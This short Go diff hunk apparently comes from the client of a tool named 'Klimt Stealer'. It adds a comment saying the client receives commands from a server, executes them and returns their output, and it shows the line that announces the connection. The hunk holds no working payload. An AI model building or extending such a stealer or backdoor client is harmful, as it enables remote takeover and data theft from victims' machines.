@@ -55,6 +55,7 @@ func Connect(server Server) *ClientSocket {
 }
 
 func (client *ClientSocket) Listen() {
+	// Listen for, execute and send the output of commands sent from the server
 	client.Conn.Write([]byte("New Klimt Stealer Client Connected! \n"))
 
 	for {
